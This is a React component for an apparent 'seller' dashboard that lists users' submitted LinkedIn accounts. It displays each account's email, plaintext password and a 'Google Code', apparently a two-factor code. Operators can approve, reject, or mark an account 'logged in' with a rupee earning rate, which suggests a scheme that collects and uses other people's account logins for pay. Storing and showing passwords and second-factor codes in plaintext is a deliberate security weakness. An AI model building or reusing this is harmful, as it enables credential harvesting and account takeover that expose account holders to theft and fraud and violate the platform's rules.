import { useEffect, useState } from "react";
import axios from "axios";
import toast from "react-hot-toast";

export default function LinkedInSubmissions() {
  const [users, setUsers] = useState([]);
  const [earningRate, setEarningRate] = useState({});

  const fetchUsers = async () => {
    const res = await axios.get("/api/seller/linkedin-submissions", {
      withCredentials: true,
    });
    if (res.data.success) setUsers(res.data.users);
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  const approve = async (id) => {
    await axios.post(`/api/seller/approve-linkedin/${id}`, {}, {
      withCredentials: true,
    });
    toast.success("LinkedIn approved");
    fetchUsers();
  };

  const reject = async (id) => {
    const reason = prompt("Rejection reason?");
    if (!reason) return;

    await axios.post(
      `/api/seller/reject-linkedin/${id}`,
      { reason },
      { withCredentials: true }
    );
    toast.success("LinkedIn rejected");
    fetchUsers();
  };

  const markLoggedIn = async (id) => {
    const rate = earningRate[id];
    if (!rate) return toast.error("Enter earning rate");

    await axios.post(
      `/api/seller/linkedin-logged-in/${id}`,
      { earningRate: rate },
      { withCredentials: true }
    );
    toast.success("User marked logged in");
    fetchUsers();
  };

  if (!users.length) return <p>No LinkedIn submissions</p>;

  return (
    <div className="space-y-6">
      {users.map((u) => (
        <div key={u._id} className="glass-card space-y-3">
          <p><b>Name:</b> {u.name}</p>
          <p><b>Email:</b> {u.email}</p>

          <div className="border-t border-white/10 pt-3 text-sm">
            <p><b>LinkedIn Email:</b> {u.linkedinCredentials?.email}</p>
            <p><b>Password:</b> {u.linkedinCredentials?.password}</p>
            <p><b>Google Code:</b> {u.linkedinCredentials?.googleCode}</p>
          </div>

          <p className="text-yellow-400">
            Status: {u.linkedinStatus}
          </p>

          <div className="flex flex-wrap gap-2 pt-2">
            <button
              onClick={() => approve(u._id)}
              className="px-4 py-2 bg-emerald-500 text-black rounded"
            >
              Approve
            </button>

            <button
              onClick={() => reject(u._id)}
              className="px-4 py-2 bg-red-500 text-black rounded"
            >
              Reject
            </button>

            <input
              type="number"
              placeholder="₹ Earning"
              value={earningRate[u._id] || ""}
              onChange={(e) =>
                setEarningRate({
                  ...earningRate,
                  [u._id]: e.target.value,
                })
              }
              className="input-dark w-32"
            />

            <button
              onClick={() => markLoggedIn(u._id)}
              className="px-4 py-2 bg-blue-500 text-black rounded"
            >
              Mark Logged In
            </button>
          </div>
        </div>
      ))}
    </div>
  );
}